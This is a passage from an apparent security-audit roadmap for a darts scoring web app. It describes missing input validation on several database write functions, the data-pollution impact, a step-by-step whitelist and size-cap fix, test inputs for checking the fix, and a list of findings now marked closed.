- `createGame()`: `gameType` is now checked against the existing
  `KNOWN_GAME_TYPES` whitelist (400 on unknown), `category` capped at 64
  characters, serialized `config` capped at 4096 bytes. Tested in
  `db.turn-validation.test.js`.
- `startChallengeAttempt()`/`completeChallengeAttempt()`: `challengeDate` now
  validated against the same `^\d{4}-\d{2}-\d{2}$` regex the read side already
  uses, `format` validated against `CHALLENGE_BETTER_DIRECTION`'s known keys.
  This is the same fix as `docs/bug-roadmap.md` **BUG-1**. Tested in
  `db.challenges.test.js`.
- `recordEvent()`: `eventType` checked against a new `KNOWN_EVENT_TYPES` list
  (the exact 6 types `frontend/index.html`'s `DB.recordEvent()` ever sends).
  Tested in `db.turn-validation.test.js`.

All 4 file locations return 400 for the bad-input cases the fix sketch below
calls out, verified both by the committed tests and a live Playwright smoke
test confirming ordinary X01/Cricket/Chuckin gameplay still creates and plays
normally after the change.

**Where / what:** all of these are parameterized (so **not** SQL injection) but accept
values with no whitelist or bound, so in the default auth-off config an unauthenticated
client can write junk that pollutes stats/leaderboards or grows the DB:

- `awardBadge()` / `revokeBadge()` (`db.js`) — `badgeId` is any string. Anyone can award
  an arbitrary or real badge to any player, or inflate a real badge's `count` without
  limit. Leaderboard/badge-case pollution.
- `createGame()` (`db.js`) — `gameType` is `gameType || 'x01'` with **no whitelist** (a
  bogus type is stored; it then silently escapes every typed stat query — see BUG-2 in the
  bug roadmap), `category` is an unbounded string, and `config` is an arbitrary object
  `JSON.stringify`'d into the row (no size cap).
- `startChallengeAttempt()` (`db.js`) — `challengeDate` and `format` are stored via bare
  `String(...)` with no `^\d{4}-\d{2}-\d{2}$` / known-format check (the *read* side —
  `getChallengeStatus`/`resetChallengeAttempt` — DOES validate the date, so a bad-date row
  is written but then unreachable; see BUG-1 in the bug roadmap).
- `recordEvent()` (`db.js`) — `eventType` is any string.

**Attack:** none of these is a takeover or injection path; the impact is (a) corrupted /
spammable stats and badges, and (b) unbounded table growth from an unauthenticated source
when `OCHE_REQUIRE_AUTH` is off. The global 300-req/60s/IP limiter (SEC-3) bounds the *rate*
but not the *total*, and multiple IPs bypass the per-IP cap.

**Fix (step by step):**
1. `awardBadge`/`revokeBadge`: validate `badgeId` against the known badge-id set (the same
   list the Badge Case already knows) and reject unknown ids with 400. Optionally cap
   `count` at a sane ceiling.
2. `createGame`: whitelist `gameType` against `KNOWN_GAME_TYPES` (already defined in
   `db.js`) and reject unknown; bound `category` length (e.g. ≤64) and the serialized
   `config` size (e.g. ≤4KB).
3. `startChallengeAttempt`/`completeChallengeAttempt`: validate `challengeDate` with the
   same `^\d{4}-\d{2}-\d{2}$` regex used on the read side, and `format` against the six
   known formats; reject otherwise with 400.
4. `recordEvent`: whitelist `eventType` against the known event types.
5. Broadly: the single biggest lever for an internet-exposed box is
   `OCHE_REQUIRE_AUTH=true` (already the SEC-6 checklist recommendation) — with it on,
   every write above requires an admin session, which removes the anonymous-pollution
   angle entirely. These per-field validations are defense-in-depth on top of that.

**Verify:** an award with a made-up `badgeId`, a `createGame` with `gameType:'evil'`, and a
`startChallengeAttempt` with `challengeDate:'not-a-date'` each return 400.

---

### Residual risk reaffirmed (not a new finding)

In the **default** `OCHE_REQUIRE_AUTH`-off configuration, every write endpoint (including
`POST /api/live`, which re-broadcasts to all `/display` screens) is unauthenticated — an
attacker on the network can inject fake games, spam stats, or hijack the scoreboard
"billboard" (the payload is key-whitelisted and size-capped by `sanitizeLiveState`, and
`display.html` escapes every field, so this is annoyance, not XSS). This is the documented
open-LAN trade-off (see the threat model at the top). For any internet-exposed deployment
the mitigation is the SEC-6 checklist — chiefly `OCHE_REQUIRE_AUTH=true` behind a
TLS-terminating reverse proxy. Reaffirming it here so a future reader doesn't mistake the
auth-off default for an oversight.

## Suggested order for Part 4

1. ~~**SEC-12** (XSS) — real, cheap, do it first.~~ ✅
2. ~~**SEC-13** (name bounds) — cheap, and it shrinks SEC-12's raw material.~~ ✅
3. ~~**SEC-14** (validate write inputs) — mostly data-integrity; pairs with the bug-roadmap
   items BUG-1/BUG-2 that share the same missing-validation root cause.~~ ✅

**Every finding in Part 4 is now closed**, alongside `docs/bug-roadmap.md`'s
BUG-1/BUG-2/BUG-3 (fixed in the same pass — see that doc).
